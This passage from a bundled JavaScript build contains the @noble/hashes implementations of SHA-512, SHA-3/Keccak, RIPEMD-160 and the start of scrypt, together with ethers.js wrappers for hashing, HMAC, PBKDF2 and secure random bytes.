  var _32n = /* @__PURE__ */ BigInt(32);
  function fromBig(n, le = false) {
    if (le)
      return { h: Number(n & U32_MASK64), l: Number(n >> _32n & U32_MASK64) };
    return { h: Number(n >> _32n & U32_MASK64) | 0, l: Number(n & U32_MASK64) | 0 };
  }
  function split(lst, le = false) {
    let Ah = new Uint32Array(lst.length);
    let Al = new Uint32Array(lst.length);
    for (let i = 0; i < lst.length; i++) {
      const { h, l } = fromBig(lst[i], le);
      [Ah[i], Al[i]] = [h, l];
    }
    return [Ah, Al];
  }
  var toBig = (h, l) => BigInt(h >>> 0) << _32n | BigInt(l >>> 0);
  var shrSH = (h, _l, s) => h >>> s;
  var shrSL = (h, l, s) => h << 32 - s | l >>> s;
  var rotrSH = (h, l, s) => h >>> s | l << 32 - s;
  var rotrSL = (h, l, s) => h << 32 - s | l >>> s;
  var rotrBH = (h, l, s) => h << 64 - s | l >>> s - 32;
  var rotrBL = (h, l, s) => h >>> s - 32 | l << 64 - s;
  var rotr32H = (_h, l) => l;
  var rotr32L = (h, _l) => h;
  var rotlSH = (h, l, s) => h << s | l >>> 32 - s;
  var rotlSL = (h, l, s) => l << s | h >>> 32 - s;
  var rotlBH = (h, l, s) => l << s - 32 | h >>> 64 - s;
  var rotlBL = (h, l, s) => h << s - 32 | l >>> 64 - s;
  function add(Ah, Al, Bh, Bl) {
    const l = (Al >>> 0) + (Bl >>> 0);
    return { h: Ah + Bh + (l / 2 ** 32 | 0) | 0, l: l | 0 };
  }
  var add3L = (Al, Bl, Cl) => (Al >>> 0) + (Bl >>> 0) + (Cl >>> 0);
  var add3H = (low, Ah, Bh, Ch) => Ah + Bh + Ch + (low / 2 ** 32 | 0) | 0;
  var add4L = (Al, Bl, Cl, Dl) => (Al >>> 0) + (Bl >>> 0) + (Cl >>> 0) + (Dl >>> 0);
  var add4H = (low, Ah, Bh, Ch, Dh) => Ah + Bh + Ch + Dh + (low / 2 ** 32 | 0) | 0;
  var add5L = (Al, Bl, Cl, Dl, El) => (Al >>> 0) + (Bl >>> 0) + (Cl >>> 0) + (Dl >>> 0) + (El >>> 0);
  var add5H = (low, Ah, Bh, Ch, Dh, Eh) => Ah + Bh + Ch + Dh + Eh + (low / 2 ** 32 | 0) | 0;
  var u64 = {
    fromBig,
    split,
    toBig,
    shrSH,
    shrSL,
    rotrSH,
    rotrSL,
    rotrBH,
    rotrBL,
    rotr32H,
    rotr32L,
    rotlSH,
    rotlSL,
    rotlBH,
    rotlBL,
    add,
    add3L,
    add3H,
    add4L,
    add4H,
    add5H,
    add5L
  };
  var u64_default = u64;

  // node_modules/@noble/hashes/esm/sha512.js
  var [SHA512_Kh, SHA512_Kl] = /* @__PURE__ */ (() => u64_default.split([
    "0x428a2f98d728ae22",
    "0x7137449123ef65cd",
    "0xb5c0fbcfec4d3b2f",
    "0xe9b5dba58189dbbc",
    "0x3956c25bf348b538",
    "0x59f111f1b605d019",
    "0x923f82a4af194f9b",
    "0xab1c5ed5da6d8118",
    "0xd807aa98a3030242",
    "0x12835b0145706fbe",
    "0x243185be4ee4b28c",
    "0x550c7dc3d5ffb4e2",
    "0x72be5d74f27b896f",
    "0x80deb1fe3b1696b1",
    "0x9bdc06a725c71235",
    "0xc19bf174cf692694",
    "0xe49b69c19ef14ad2",
    "0xefbe4786384f25e3",
    "0x0fc19dc68b8cd5b5",
    "0x240ca1cc77ac9c65",
    "0x2de92c6f592b0275",
    "0x4a7484aa6ea6e483",
    "0x5cb0a9dcbd41fbd4",
    "0x76f988da831153b5",
    "0x983e5152ee66dfab",
    "0xa831c66d2db43210",
    "0xb00327c898fb213f",
    "0xbf597fc7beef0ee4",
    "0xc6e00bf33da88fc2",
    "0xd5a79147930aa725",
    "0x06ca6351e003826f",
    "0x142929670a0e6e70",
    "0x27b70a8546d22ffc",
    "0x2e1b21385c26c926",
    "0x4d2c6dfc5ac42aed",
    "0x53380d139d95b3df",
    "0x650a73548baf63de",
    "0x766a0abb3c77b2a8",
    "0x81c2c92e47edaee6",
    "0x92722c851482353b",
    "0xa2bfe8a14cf10364",
    "0xa81a664bbc423001",
    "0xc24b8b70d0f89791",
    "0xc76c51a30654be30",
    "0xd192e819d6ef5218",
    "0xd69906245565a910",
    "0xf40e35855771202a",
    "0x106aa07032bbd1b8",
    "0x19a4c116b8d2d0c8",
    "0x1e376c085141ab53",
    "0x2748774cdf8eeb99",
    "0x34b0bcb5e19b48a8",
    "0x391c0cb3c5c95a63",
    "0x4ed8aa4ae3418acb",
    "0x5b9cca4f7763e373",
    "0x682e6ff3d6b2b8a3",
    "0x748f82ee5defb2fc",
    "0x78a5636f43172f60",
    "0x84c87814a1f0ab72",
    "0x8cc702081a6439ec",
    "0x90befffa23631e28",
    "0xa4506cebde82bde9",
    "0xbef9a3f7b2c67915",
    "0xc67178f2e372532b",
    "0xca273eceea26619c",
    "0xd186b8c721c0c207",
    "0xeada7dd6cde0eb1e",
    "0xf57d4f7fee6ed178",
    "0x06f067aa72176fba",
    "0x0a637dc5a2c898a6",
    "0x113f9804bef90dae",
    "0x1b710b35131c471b",
    "0x28db77f523047d84",
    "0x32caab7b40c72493",
    "0x3c9ebe0a15c9bebc",
    "0x431d67c49c100d4c",
    "0x4cc5d4becb3e42b6",
    "0x597f299cfc657e2a",
    "0x5fcb6fab3ad6faec",
    "0x6c44198c4a475817"
  ].map((n) => BigInt(n))))();
  var SHA512_W_H = /* @__PURE__ */ new Uint32Array(80);
  var SHA512_W_L = /* @__PURE__ */ new Uint32Array(80);
  var SHA512 = class extends SHA2 {
    constructor() {
      super(128, 64, 16, false);
      this.Ah = 1779033703 | 0;
      this.Al = 4089235720 | 0;
      this.Bh = 3144134277 | 0;
      this.Bl = 2227873595 | 0;
      this.Ch = 1013904242 | 0;
      this.Cl = 4271175723 | 0;
      this.Dh = 2773480762 | 0;
      this.Dl = 1595750129 | 0;
      this.Eh = 1359893119 | 0;
      this.El = 2917565137 | 0;
      this.Fh = 2600822924 | 0;
      this.Fl = 725511199 | 0;
      this.Gh = 528734635 | 0;
      this.Gl = 4215389547 | 0;
      this.Hh = 1541459225 | 0;
      this.Hl = 327033209 | 0;
    }
    // prettier-ignore
    get() {
      const { Ah, Al, Bh, Bl, Ch, Cl, Dh, Dl, Eh, El, Fh, Fl, Gh, Gl, Hh, Hl } = this;
      return [Ah, Al, Bh, Bl, Ch, Cl, Dh, Dl, Eh, El, Fh, Fl, Gh, Gl, Hh, Hl];
    }
    // prettier-ignore
    set(Ah, Al, Bh, Bl, Ch, Cl, Dh, Dl, Eh, El, Fh, Fl, Gh, Gl, Hh, Hl) {
      this.Ah = Ah | 0;
      this.Al = Al | 0;
      this.Bh = Bh | 0;
      this.Bl = Bl | 0;
      this.Ch = Ch | 0;
      this.Cl = Cl | 0;
      this.Dh = Dh | 0;
      this.Dl = Dl | 0;
      this.Eh = Eh | 0;
      this.El = El | 0;
      this.Fh = Fh | 0;
      this.Fl = Fl | 0;
      this.Gh = Gh | 0;
      this.Gl = Gl | 0;
      this.Hh = Hh | 0;
      this.Hl = Hl | 0;
    }
    process(view, offset) {
      for (let i = 0; i < 16; i++, offset += 4) {
        SHA512_W_H[i] = view.getUint32(offset);
        SHA512_W_L[i] = view.getUint32(offset += 4);
      }
      for (let i = 16; i < 80; i++) {
        const W15h = SHA512_W_H[i - 15] | 0;
        const W15l = SHA512_W_L[i - 15] | 0;
        const s0h = u64_default.rotrSH(W15h, W15l, 1) ^ u64_default.rotrSH(W15h, W15l, 8) ^ u64_default.shrSH(W15h, W15l, 7);
        const s0l = u64_default.rotrSL(W15h, W15l, 1) ^ u64_default.rotrSL(W15h, W15l, 8) ^ u64_default.shrSL(W15h, W15l, 7);
        const W2h = SHA512_W_H[i - 2] | 0;
        const W2l = SHA512_W_L[i - 2] | 0;
        const s1h = u64_default.rotrSH(W2h, W2l, 19) ^ u64_default.rotrBH(W2h, W2l, 61) ^ u64_default.shrSH(W2h, W2l, 6);
        const s1l = u64_default.rotrSL(W2h, W2l, 19) ^ u64_default.rotrBL(W2h, W2l, 61) ^ u64_default.shrSL(W2h, W2l, 6);
        const SUMl = u64_default.add4L(s0l, s1l, SHA512_W_L[i - 7], SHA512_W_L[i - 16]);
        const SUMh = u64_default.add4H(SUMl, s0h, s1h, SHA512_W_H[i - 7], SHA512_W_H[i - 16]);
        SHA512_W_H[i] = SUMh | 0;
        SHA512_W_L[i] = SUMl | 0;
      }
      let { Ah, Al, Bh, Bl, Ch, Cl, Dh, Dl, Eh, El, Fh, Fl, Gh, Gl, Hh, Hl } = this;
      for (let i = 0; i < 80; i++) {
        const sigma1h = u64_default.rotrSH(Eh, El, 14) ^ u64_default.rotrSH(Eh, El, 18) ^ u64_default.rotrBH(Eh, El, 41);
        const sigma1l = u64_default.rotrSL(Eh, El, 14) ^ u64_default.rotrSL(Eh, El, 18) ^ u64_default.rotrBL(Eh, El, 41);
        const CHIh = Eh & Fh ^ ~Eh & Gh;
        const CHIl = El & Fl ^ ~El & Gl;
        const T1ll = u64_default.add5L(Hl, sigma1l, CHIl, SHA512_Kl[i], SHA512_W_L[i]);
        const T1h = u64_default.add5H(T1ll, Hh, sigma1h, CHIh, SHA512_Kh[i], SHA512_W_H[i]);
        const T1l = T1ll | 0;
        const sigma0h = u64_default.rotrSH(Ah, Al, 28) ^ u64_default.rotrBH(Ah, Al, 34) ^ u64_default.rotrBH(Ah, Al, 39);
        const sigma0l = u64_default.rotrSL(Ah, Al, 28) ^ u64_default.rotrBL(Ah, Al, 34) ^ u64_default.rotrBL(Ah, Al, 39);
        const MAJh = Ah & Bh ^ Ah & Ch ^ Bh & Ch;
        const MAJl = Al & Bl ^ Al & Cl ^ Bl & Cl;
        Hh = Gh | 0;
        Hl = Gl | 0;
        Gh = Fh | 0;
        Gl = Fl | 0;
        Fh = Eh | 0;
        Fl = El | 0;
        ({ h: Eh, l: El } = u64_default.add(Dh | 0, Dl | 0, T1h | 0, T1l | 0));
        Dh = Ch | 0;
        Dl = Cl | 0;
        Ch = Bh | 0;
        Cl = Bl | 0;
        Bh = Ah | 0;
        Bl = Al | 0;
        const All = u64_default.add3L(T1l, sigma0l, MAJl);
        Ah = u64_default.add3H(All, T1h, sigma0h, MAJh);
        Al = All | 0;
      }
      ({ h: Ah, l: Al } = u64_default.add(this.Ah | 0, this.Al | 0, Ah | 0, Al | 0));
      ({ h: Bh, l: Bl } = u64_default.add(this.Bh | 0, this.Bl | 0, Bh | 0, Bl | 0));
      ({ h: Ch, l: Cl } = u64_default.add(this.Ch | 0, this.Cl | 0, Ch | 0, Cl | 0));
      ({ h: Dh, l: Dl } = u64_default.add(this.Dh | 0, this.Dl | 0, Dh | 0, Dl | 0));
      ({ h: Eh, l: El } = u64_default.add(this.Eh | 0, this.El | 0, Eh | 0, El | 0));
      ({ h: Fh, l: Fl } = u64_default.add(this.Fh | 0, this.Fl | 0, Fh | 0, Fl | 0));
      ({ h: Gh, l: Gl } = u64_default.add(this.Gh | 0, this.Gl | 0, Gh | 0, Gl | 0));
      ({ h: Hh, l: Hl } = u64_default.add(this.Hh | 0, this.Hl | 0, Hh | 0, Hl | 0));
      this.set(Ah, Al, Bh, Bl, Ch, Cl, Dh, Dl, Eh, El, Fh, Fl, Gh, Gl, Hh, Hl);
    }
    roundClean() {
      SHA512_W_H.fill(0);
      SHA512_W_L.fill(0);
    }
    destroy() {
      this.buffer.fill(0);
      this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }
  };
  var sha512 = /* @__PURE__ */ wrapConstructor(() => new SHA512());

  // node_modules/ethers/lib.esm/crypto/crypto-browser.js
  function getGlobal() {
    if (typeof self !== "undefined") {
      return self;
    }
    if (typeof window !== "undefined") {
      return window;
    }
    if (typeof global !== "undefined") {
      return global;
    }
    throw new Error("unable to locate global object");
  }
  var anyGlobal = getGlobal();
  var crypto2 = anyGlobal.crypto || anyGlobal.msCrypto;
  function createHash(algo) {
    switch (algo) {
      case "sha256":
        return sha256.create();
      case "sha512":
        return sha512.create();
    }
    assertArgument(false, "invalid hashing algorithm name", "algorithm", algo);
  }
  function createHmac(_algo, key) {
    const algo = { sha256, sha512 }[_algo];
    assertArgument(algo != null, "invalid hmac algorithm", "algorithm", _algo);
    return hmac.create(algo, key);
  }
  function pbkdf2Sync(password, salt, iterations, keylen, _algo) {
    const algo = { sha256, sha512 }[_algo];
    assertArgument(algo != null, "invalid pbkdf2 algorithm", "algorithm", _algo);
    return pbkdf2(algo, password, salt, { c: iterations, dkLen: keylen });
  }
  function randomBytes2(length) {
    assert(crypto2 != null, "platform does not support secure random numbers", "UNSUPPORTED_OPERATION", {
      operation: "randomBytes"
    });
    assertArgument(Number.isInteger(length) && length > 0 && length <= 1024, "invalid length", "length", length);
    const result = new Uint8Array(length);
    crypto2.getRandomValues(result);
    return result;
  }

  // node_modules/ethers/lib.esm/crypto/hmac.js
  var locked = false;
  var _computeHmac = function(algorithm, key, data) {
    return createHmac(algorithm, key).update(data).digest();
  };
  var __computeHmac = _computeHmac;
  function computeHmac(algorithm, _key, _data) {
    const key = getBytes(_key, "key");
    const data = getBytes(_data, "data");
    return hexlify(__computeHmac(algorithm, key, data));
  }
  computeHmac._ = _computeHmac;
  computeHmac.lock = function() {
    locked = true;
  };
  computeHmac.register = function(func) {
    if (locked) {
      throw new Error("computeHmac is locked");
    }
    __computeHmac = func;
  };
  Object.freeze(computeHmac);

  // node_modules/@noble/hashes/esm/sha3.js
  var [SHA3_PI, SHA3_ROTL, _SHA3_IOTA] = [[], [], []];
  var _0n = /* @__PURE__ */ BigInt(0);
  var _1n = /* @__PURE__ */ BigInt(1);
  var _2n = /* @__PURE__ */ BigInt(2);
  var _7n = /* @__PURE__ */ BigInt(7);
  var _256n = /* @__PURE__ */ BigInt(256);
  var _0x71n = /* @__PURE__ */ BigInt(113);
  for (let round = 0, R = _1n, x = 1, y = 0; round < 24; round++) {
    [x, y] = [y, (2 * x + 3 * y) % 5];
    SHA3_PI.push(2 * (5 * y + x));
    SHA3_ROTL.push((round + 1) * (round + 2) / 2 % 64);
    let t = _0n;
    for (let j = 0; j < 7; j++) {
      R = (R << _1n ^ (R >> _7n) * _0x71n) % _256n;
      if (R & _2n)
        t ^= _1n << (_1n << /* @__PURE__ */ BigInt(j)) - _1n;
    }
    _SHA3_IOTA.push(t);
  }
  var [SHA3_IOTA_H, SHA3_IOTA_L] = /* @__PURE__ */ split(_SHA3_IOTA, true);
  var rotlH = (h, l, s) => s > 32 ? rotlBH(h, l, s) : rotlSH(h, l, s);
  var rotlL = (h, l, s) => s > 32 ? rotlBL(h, l, s) : rotlSL(h, l, s);
  function keccakP(s, rounds = 24) {
    const B = new Uint32Array(5 * 2);
    for (let round = 24 - rounds; round < 24; round++) {
      for (let x = 0; x < 10; x++)
        B[x] = s[x] ^ s[x + 10] ^ s[x + 20] ^ s[x + 30] ^ s[x + 40];
      for (let x = 0; x < 10; x += 2) {
        const idx1 = (x + 8) % 10;
        const idx0 = (x + 2) % 10;
        const B0 = B[idx0];
        const B1 = B[idx0 + 1];
        const Th = rotlH(B0, B1, 1) ^ B[idx1];
        const Tl = rotlL(B0, B1, 1) ^ B[idx1 + 1];
        for (let y = 0; y < 50; y += 10) {
          s[x + y] ^= Th;
          s[x + y + 1] ^= Tl;
        }
      }
      let curH = s[2];
      let curL = s[3];
      for (let t = 0; t < 24; t++) {
        const shift = SHA3_ROTL[t];
        const Th = rotlH(curH, curL, shift);
        const Tl = rotlL(curH, curL, shift);
        const PI = SHA3_PI[t];
        curH = s[PI];
        curL = s[PI + 1];
        s[PI] = Th;
        s[PI + 1] = Tl;
      }
      for (let y = 0; y < 50; y += 10) {
        for (let x = 0; x < 10; x++)
          B[x] = s[y + x];
        for (let x = 0; x < 10; x++)
          s[y + x] ^= ~B[(x + 2) % 10] & B[(x + 4) % 10];
      }
      s[0] ^= SHA3_IOTA_H[round];
      s[1] ^= SHA3_IOTA_L[round];
    }
    B.fill(0);
  }
  var Keccak = class _Keccak extends Hash {
    // NOTE: we accept arguments in bytes instead of bits here.
    constructor(blockLen, suffix, outputLen, enableXOF = false, rounds = 24) {
      super();
      this.blockLen = blockLen;
      this.suffix = suffix;
      this.outputLen = outputLen;
      this.enableXOF = enableXOF;
      this.rounds = rounds;
      this.pos = 0;
      this.posOut = 0;
      this.finished = false;
      this.destroyed = false;
      number(outputLen);
      if (0 >= this.blockLen || this.blockLen >= 200)
        throw new Error("Sha3 supports only keccak-f1600 function");
      this.state = new Uint8Array(200);
      this.state32 = u32(this.state);
    }
    keccak() {
      keccakP(this.state32, this.rounds);
      this.posOut = 0;
      this.pos = 0;
    }
    update(data) {
      exists(this);
      const { blockLen, state } = this;
      data = toBytes(data);
      const len = data.length;
      for (let pos = 0; pos < len; ) {
        const take = Math.min(blockLen - this.pos, len - pos);
        for (let i = 0; i < take; i++)
          state[this.pos++] ^= data[pos++];
        if (this.pos === blockLen)
          this.keccak();
      }
      return this;
    }
    finish() {
      if (this.finished)
        return;
      this.finished = true;
      const { state, suffix, pos, blockLen } = this;
      state[pos] ^= suffix;
      if ((suffix & 128) !== 0 && pos === blockLen - 1)
        this.keccak();
      state[blockLen - 1] ^= 128;
      this.keccak();
    }
    writeInto(out) {
      exists(this, false);
      bytes(out);
      this.finish();
      const bufferOut = this.state;
      const { blockLen } = this;
      for (let pos = 0, len = out.length; pos < len; ) {
        if (this.posOut >= blockLen)
          this.keccak();
        const take = Math.min(blockLen - this.posOut, len - pos);
        out.set(bufferOut.subarray(this.posOut, this.posOut + take), pos);
        this.posOut += take;
        pos += take;
      }
      return out;
    }
    xofInto(out) {
      if (!this.enableXOF)
        throw new Error("XOF is not possible for this instance");
      return this.writeInto(out);
    }
    xof(bytes2) {
      number(bytes2);
      return this.xofInto(new Uint8Array(bytes2));
    }
    digestInto(out) {
      output(out, this);
      if (this.finished)
        throw new Error("digest() was already called");
      this.writeInto(out);
      this.destroy();
      return out;
    }
    digest() {
      return this.digestInto(new Uint8Array(this.outputLen));
    }
    destroy() {
      this.destroyed = true;
      this.state.fill(0);
    }
    _cloneInto(to) {
      const { blockLen, suffix, outputLen, rounds, enableXOF } = this;
      to || (to = new _Keccak(blockLen, suffix, outputLen, enableXOF, rounds));
      to.state32.set(this.state32);
      to.pos = this.pos;
      to.posOut = this.posOut;
      to.finished = this.finished;
      to.rounds = rounds;
      to.suffix = suffix;
      to.outputLen = outputLen;
      to.enableXOF = enableXOF;
      to.destroyed = this.destroyed;
      return to;
    }
  };
  var gen = (suffix, blockLen, outputLen) => wrapConstructor(() => new Keccak(blockLen, suffix, outputLen));
  var sha3_224 = /* @__PURE__ */ gen(6, 144, 224 / 8);
  var sha3_256 = /* @__PURE__ */ gen(6, 136, 256 / 8);
  var sha3_384 = /* @__PURE__ */ gen(6, 104, 384 / 8);
  var sha3_512 = /* @__PURE__ */ gen(6, 72, 512 / 8);
  var keccak_224 = /* @__PURE__ */ gen(1, 144, 224 / 8);
  var keccak_256 = /* @__PURE__ */ gen(1, 136, 256 / 8);
  var keccak_384 = /* @__PURE__ */ gen(1, 104, 384 / 8);
  var keccak_512 = /* @__PURE__ */ gen(1, 72, 512 / 8);
  var genShake = (suffix, blockLen, outputLen) => wrapXOFConstructorWithOpts((opts = {}) => new Keccak(blockLen, suffix, opts.dkLen === void 0 ? outputLen : opts.dkLen, true));
  var shake128 = /* @__PURE__ */ genShake(31, 168, 128 / 8);
  var shake256 = /* @__PURE__ */ genShake(31, 136, 256 / 8);

  // node_modules/ethers/lib.esm/crypto/keccak.js
  var locked2 = false;
  var _keccak256 = function(data) {
    return keccak_256(data);
  };
  var __keccak256 = _keccak256;
  function keccak256(_data) {
    const data = getBytes(_data, "data");
    return hexlify(__keccak256(data));
  }
  keccak256._ = _keccak256;
  keccak256.lock = function() {
    locked2 = true;
  };
  keccak256.register = function(func) {
    if (locked2) {
      throw new TypeError("keccak256 is locked");
    }
    __keccak256 = func;
  };
  Object.freeze(keccak256);

  // node_modules/@noble/hashes/esm/ripemd160.js
  var Rho = /* @__PURE__ */ new Uint8Array([7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8]);
  var Id = /* @__PURE__ */ Uint8Array.from({ length: 16 }, (_, i) => i);
  var Pi = /* @__PURE__ */ Id.map((i) => (9 * i + 5) % 16);
  var idxL = [Id];
  var idxR = [Pi];
  for (let i = 0; i < 4; i++)
    for (let j of [idxL, idxR])
      j.push(j[i].map((k) => Rho[k]));
  var shifts = /* @__PURE__ */ [
    [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8],
    [12, 13, 11, 15, 6, 9, 9, 7, 12, 15, 11, 13, 7, 8, 7, 7],
    [13, 15, 14, 11, 7, 7, 6, 8, 13, 14, 13, 12, 5, 5, 6, 9],
    [14, 11, 12, 14, 8, 6, 5, 5, 15, 12, 15, 14, 9, 9, 8, 6],
    [15, 12, 13, 13, 9, 5, 8, 6, 14, 11, 12, 11, 8, 6, 5, 5]
  ].map((i) => new Uint8Array(i));
  var shiftsL = /* @__PURE__ */ idxL.map((idx, i) => idx.map((j) => shifts[i][j]));
  var shiftsR = /* @__PURE__ */ idxR.map((idx, i) => idx.map((j) => shifts[i][j]));
  var Kl = /* @__PURE__ */ new Uint32Array([
    0,
    1518500249,
    1859775393,
    2400959708,
    2840853838
  ]);
  var Kr = /* @__PURE__ */ new Uint32Array([
    1352829926,
    1548603684,
    1836072691,
    2053994217,
    0
  ]);
  var rotl = (word, shift) => word << shift | word >>> 32 - shift;
  function f(group, x, y, z) {
    if (group === 0)
      return x ^ y ^ z;
    else if (group === 1)
      return x & y | ~x & z;
    else if (group === 2)
      return (x | ~y) ^ z;
    else if (group === 3)
      return x & z | y & ~z;
    else
      return x ^ (y | ~z);
  }
  var BUF = /* @__PURE__ */ new Uint32Array(16);
  var RIPEMD160 = class extends SHA2 {
    constructor() {
      super(64, 20, 8, true);
      this.h0 = 1732584193 | 0;
      this.h1 = 4023233417 | 0;
      this.h2 = 2562383102 | 0;
      this.h3 = 271733878 | 0;
      this.h4 = 3285377520 | 0;
    }
    get() {
      const { h0, h1, h2, h3, h4 } = this;
      return [h0, h1, h2, h3, h4];
    }
    set(h0, h1, h2, h3, h4) {
      this.h0 = h0 | 0;
      this.h1 = h1 | 0;
      this.h2 = h2 | 0;
      this.h3 = h3 | 0;
      this.h4 = h4 | 0;
    }
    process(view, offset) {
      for (let i = 0; i < 16; i++, offset += 4)
        BUF[i] = view.getUint32(offset, true);
      let al = this.h0 | 0, ar = al, bl = this.h1 | 0, br = bl, cl = this.h2 | 0, cr = cl, dl = this.h3 | 0, dr = dl, el = this.h4 | 0, er = el;
      for (let group = 0; group < 5; group++) {
        const rGroup = 4 - group;
        const hbl = Kl[group], hbr = Kr[group];
        const rl = idxL[group], rr = idxR[group];
        const sl = shiftsL[group], sr = shiftsR[group];
        for (let i = 0; i < 16; i++) {
          const tl = rotl(al + f(group, bl, cl, dl) + BUF[rl[i]] + hbl, sl[i]) + el | 0;
          al = el, el = dl, dl = rotl(cl, 10) | 0, cl = bl, bl = tl;
        }
        for (let i = 0; i < 16; i++) {
          const tr = rotl(ar + f(rGroup, br, cr, dr) + BUF[rr[i]] + hbr, sr[i]) + er | 0;
          ar = er, er = dr, dr = rotl(cr, 10) | 0, cr = br, br = tr;
        }
      }
      this.set(this.h1 + cl + dr | 0, this.h2 + dl + er | 0, this.h3 + el + ar | 0, this.h4 + al + br | 0, this.h0 + bl + cr | 0);
    }
    roundClean() {
      BUF.fill(0);
    }
    destroy() {
      this.destroyed = true;
      this.buffer.fill(0);
      this.set(0, 0, 0, 0, 0);
    }
  };
  var ripemd160 = /* @__PURE__ */ wrapConstructor(() => new RIPEMD160());

  // node_modules/ethers/lib.esm/crypto/ripemd160.js
  var locked3 = false;
  var _ripemd160 = function(data) {
    return ripemd160(data);
  };
  var __ripemd160 = _ripemd160;
  function ripemd1602(_data) {
    const data = getBytes(_data, "data");
    return hexlify(__ripemd160(data));
  }
  ripemd1602._ = _ripemd160;
  ripemd1602.lock = function() {
    locked3 = true;
  };
  ripemd1602.register = function(func) {
    if (locked3) {
      throw new TypeError("ripemd160 is locked");
    }
    __ripemd160 = func;
  };
  Object.freeze(ripemd1602);

  // node_modules/ethers/lib.esm/crypto/pbkdf2.js
  var locked4 = false;
  var _pbkdf2 = function(password, salt, iterations, keylen, algo) {
    return pbkdf2Sync(password, salt, iterations, keylen, algo);
  };
  var __pbkdf2 = _pbkdf2;
  function pbkdf22(_password, _salt, iterations, keylen, algo) {
    const password = getBytes(_password, "password");
    const salt = getBytes(_salt, "salt");
    return hexlify(__pbkdf2(password, salt, iterations, keylen, algo));
  }
  pbkdf22._ = _pbkdf2;
  pbkdf22.lock = function() {
    locked4 = true;
  };
  pbkdf22.register = function(func) {
    if (locked4) {
      throw new Error("pbkdf2 is locked");
    }
    __pbkdf2 = func;
  };
  Object.freeze(pbkdf22);

  // node_modules/ethers/lib.esm/crypto/random.js
  var locked5 = false;
  var _randomBytes = function(length) {
    return new Uint8Array(randomBytes2(length));
  };
  var __randomBytes = _randomBytes;
  function randomBytes3(length) {
    return __randomBytes(length);
  }
  randomBytes3._ = _randomBytes;
  randomBytes3.lock = function() {
    locked5 = true;
  };
  randomBytes3.register = function(func) {
    if (locked5) {
      throw new Error("randomBytes is locked");
    }
    __randomBytes = func;
  };
  Object.freeze(randomBytes3);

  // node_modules/@noble/hashes/esm/scrypt.js
  var rotl2 = (a, b) => a << b | a >>> 32 - b;
  function XorAndSalsa(prev, pi, input, ii, out, oi) {
    let y00 = prev[pi++] ^ input[ii++], y01 = prev[pi++] ^ input[ii++];
    let y02 = prev[pi++] ^ input[ii++], y03 = prev[pi++] ^ input[ii++];
    let y04 = prev[pi++] ^ input[ii++], y05 = prev[pi++] ^ input[ii++];
    let y06 = prev[pi++] ^ input[ii++], y07 = prev[pi++] ^ input[ii++];
    let y08 = prev[pi++] ^ input[ii++], y09 = prev[pi++] ^ input[ii++];
    let y10 = prev[pi++] ^ input[ii++], y11 = prev[pi++] ^ input[ii++];
    let y12 = prev[pi++] ^ input[ii++], y13 = prev[pi++] ^ input[ii++];
    let y14 = prev[pi++] ^ input[ii++], y15 = prev[pi++] ^ input[ii++];
    let x00 = y00, x01 = y01, x02 = y02, x03 = y03, x04 = y04, x05 = y05, x06 = y06, x07 = y07, x08 = y08, x09 = y09, x10 = y10, x11 = y11, x12 = y12, x13 = y13, x14 = y14, x15 = y15;
    for (let i = 0; i < 8; i += 2) {
      x04 ^= rotl2(x00 + x12 | 0, 7);
      x08 ^= rotl2(x04 + x00 | 0, 9);
      x12 ^= rotl2(x08 + x04 | 0, 13);
      x00 ^= rotl2(x12 + x08 | 0, 18);
      x09 ^= rotl2(x05 + x01 | 0, 7);
      x13 ^= rotl2(x09 + x05 | 0, 9);
      x01 ^= rotl2(x13 + x09 | 0, 13);
      x05 ^= rotl2(x01 + x13 | 0, 18);
      x14 ^= rotl2(x10 + x06 | 0, 7);
      x02 ^= rotl2(x14 + x10 | 0, 9);
      x06 ^= rotl2(x02 + x14 | 0, 13);
      x10 ^= rotl2(x06 + x02 | 0, 18);
      x03 ^= rotl2(x15 + x11 | 0, 7);
      x07 ^= rotl2(x03 + x15 | 0, 9);
      x11 ^= rotl2(x07 + x03 | 0, 13);
      x15 ^= rotl2(x11 + x07 | 0, 18);
      x01 ^= rotl2(x00 + x03 | 0, 7);
      x02 ^= rotl2(x01 + x00 | 0, 9);
      x03 ^= rotl2(x02 + x01 | 0, 13);
      x00 ^= rotl2(x03 + x02 | 0, 18);
      x06 ^= rotl2(x05 + x04 | 0, 7);
      x07 ^= rotl2(x06 + x05 | 0, 9);
      x04 ^= rotl2(x07 + x06 | 0, 13);
      x05 ^= rotl2(x04 + x07 | 0, 18);
      x11 ^= rotl2(x10 + x09 | 0, 7);
      x08 ^= rotl2(x11 + x10 | 0, 9);
      x09 ^= rotl2(x08 + x11 | 0, 13);
      x10 ^= rotl2(x09 + x08 | 0, 18);
      x12 ^= rotl2(x15 + x14 | 0, 7);
      x13 ^= rotl2(x12 + x15 | 0, 9);
      x14 ^= rotl2(x13 + x12 | 0, 13);
      x15 ^= rotl2(x14 + x13 | 0, 18);
    }
    out[oi++] = y00 + x00 | 0;
    out[oi++] = y01 + x01 | 0;
    out[oi++] = y02 + x02 | 0;
    out[oi++] = y03 + x03 | 0;
    out[oi++] = y04 + x04 | 0;
    out[oi++] = y05 + x05 | 0;
    out[oi++] = y06 + x06 | 0;
    out[oi++] = y07 + x07 | 0;
    out[oi++] = y08 + x08 | 0;
    out[oi++] = y09 + x09 | 0;
    out[oi++] = y10 + x10 | 0;
    out[oi++] = y11 + x11 | 0;
    out[oi++] = y12 + x12 | 0;
    out[oi++] = y13 + x13 | 0;
    out[oi++] = y14 + x14 | 0;
    out[oi++] = y15 + x15 | 0;
  }
  function BlockMix(input, ii, out, oi, r) {
    let head = oi + 0;
    let tail = oi + 16 * r;
    for (let i = 0; i < 16; i++)
      out[tail + i] = input[ii + (2 * r - 1) * 16 + i];
    for (let i = 0; i < r; i++, head += 16, ii += 16) {
      XorAndSalsa(out, tail, input, ii, out, head);
      if (i > 0)
        tail += 16;
      XorAndSalsa(out, head, input, ii += 16, out, tail);
    }
  }
  function scryptInit(password, salt, _opts) {
    const opts = checkOpts({
      dkLen: 32,
      asyncTick: 10,
      maxmem: 1024 ** 3 + 1024
    }, _opts);
    const { N: N2, r, p, dkLen, asyncTick, maxmem, onProgress } = opts;
    number(N2);
    number(r);
    number(p);
    number(dkLen);
    number(asyncTick);
    number(maxmem);
